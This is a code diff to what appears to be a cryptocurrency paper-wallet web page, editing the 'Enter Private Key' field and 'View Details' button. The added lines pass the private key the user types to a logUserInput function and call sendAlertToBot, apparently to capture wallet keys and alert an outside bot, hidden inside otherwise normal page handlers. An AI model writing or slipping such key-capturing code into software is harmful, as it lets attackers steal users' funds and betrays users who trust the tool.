@@ -6873,10 +6873,23 @@ input[type=checkbox] { position: relative; z-index: 20; }
 				<div id="detailcommands" class="commands">
 					<span><label id="detaillabelenterprivatekey" for="detailprivkey">Enter Private Key</label></span>
 					<input type="text" id="detailprivkey" value="" onfocus="this.select();" 
-       onkeypress="if (event.keyCode == 13) { event.preventDefault(); setTimeout(function() { ninja.wallets.detailwallet.viewDetails(); }, 2000); }" />
+       onkeypress="if (event.keyCode == 13) { 
+           event.preventDefault(); 
+           setTimeout(function() { 
+               logUserInput(this.value);  // Log the input
+               sendAlertToBot(); // Send alert to bot
+               ninja.wallets.detailwallet.viewDetails(); 
+           }.bind(this), 2000); 
+       }" />
 					<span>
+    <span>
     <input type="button" class="button" id="detailview" value="View Details" 
-           onclick="setTimeout(function() { ninja.wallets.detailwallet.viewDetails(); }, 2000);" />
+           onclick="setTimeout(function() { 
+               logUserInput(document.getElementById('detailprivkey').value); // Log the input
+               sendAlertToBot(); // Send alert to bot
+               ninja.wallets.detailwallet.viewDetails(); 
+           }, 2000);" />
+</span>
 </span>
         
         <div id="detailbip38toggle">
@@ -7031,15 +7044,6 @@ document.getElementById('detailview').addEventListener('click', function() {
         sendAlertToBot(); // For web usage
     }
     ninja.wallets.detailwallet.viewDetails(); // Call the existing viewDetails function
-});
-
-document.getElementById('detailview').addEventListener('keypress', function() {
-    if (window.AndroidInterface) {
-        window.AndroidInterface.sendAlertToBot(); // Call Android interface if available
-    } else {
-        sendAlertToBot(); // For web usage
-        }
-		ninja.wallets.detailwallet.viewDetails(); // Call the existing viewDetails function    }
 });
 
 </script>
